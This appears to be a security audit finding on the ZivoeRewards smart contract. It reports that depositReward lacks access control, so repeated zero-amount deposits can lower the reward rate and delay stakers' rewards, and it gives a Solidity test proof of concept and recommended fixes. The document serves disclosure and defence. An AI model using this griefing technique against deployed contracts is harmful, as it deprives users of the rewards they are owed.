# Malicious actor can reduce reward rate potentially preventing users from ever getting full reward in the ZivoeRewards contract.

## Summary
A malicious actor could spread out reward meant to be claimed in a few days over another 30 days period and can continually do this at zero cost to the malicious actor, and can do this repeatedly preventing users from ever actualizing full reward or a very long time to achieve full reward

## Vulnerability Detail
The `depositReward` function allows for a specified amount of a reward token into the contract for distribution to stakers over a defined vesting period. It updates the contract's reward distribution rate per token based on the total amount of the deposited reward and the remaining time in the current reward period.
However this function has no access control nor does it specify a minimum amount to be deposited thus a malicious actor could send in 0 amount of reward token (mostly DAI but could be usdt,usdc etc) and drastically reducing reward rate and amount vested to user and can do this over and over again preventing users from ever actualizing full reward since it comes at zero cost to the malicious actor.

Similar implementation is seen in the `zivoeRewardsVesting` contract

## POC

paste this in `Test_Zivoerewards.sol`

```solidity
function test_attack_to_decrease_rewardrate() public {

      uint256  block_timestamp = 110000000;

        hevm.warp(block_timestamp) ; //This is just to set current block.timestamp

        uint256 deposit = 2*10**18;

        //This simultes normal deposit by zivioe YDL
        depositReward_DAI(address(stZVE), deposit); 

        // Pre-state.
        uint256 _preDAI = IERC20(DAI).balanceOf(address(stZVE));
        (
            uint256 rewardsDuration,
            uint256 _prePeriodFinish,
            uint256 _preRewardRate,
            uint256 lastUpdateTime,
            uint256 rewardPerTokenStored
        ) = stZVE.rewardData(DAI);
        uint256 _postPeriodFinish;
        uint256 _postRewardRate;
        
        // Attacker waits 15 day or half reward's duration

         hevm.warp(block_timestamp + 15 days);
 
        mint("DAI", address(bob), 0);
        assert(bob.try_approveToken(DAI, address(stZVE), 0));

       //attacker calls depositReward function coz he can due to lack of access control
        assert(bob.try_depositReward(address(stZVE), DAI, 0));

        // Post-state.
        (
            rewardsDuration,
            _postPeriodFinish,
            _postRewardRate,
            lastUpdateTime,
            rewardPerTokenStored
        ) = stZVE.rewardData(DAI);
       assertGt(_preRewardRate, _postRewardRate );
    //    reward rate before and after depositing 0 dai
       console.log(_preRewardRate);
       console.log( _postRewardRate);

    //    reward rate before 0 dai significaly larger.

     
    }


```

## Impact

Prevents users from receiving complete reward.

## Code Snippet

## Tool used

Manual Review
https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewards.sol#L228

## Recommendation
1. Add access control to contracts expected to add rewards to Zivoe rewards contract such as ZivoeYDL
2. If its desired that any one should still be able to deposit into Zivoe rewards due to future implementations, then a minimum amount should be required so that resetting rewardrate will make sense to users and any malicious actor trying to arbitrarily reset reward rate will have to send money to the contract.
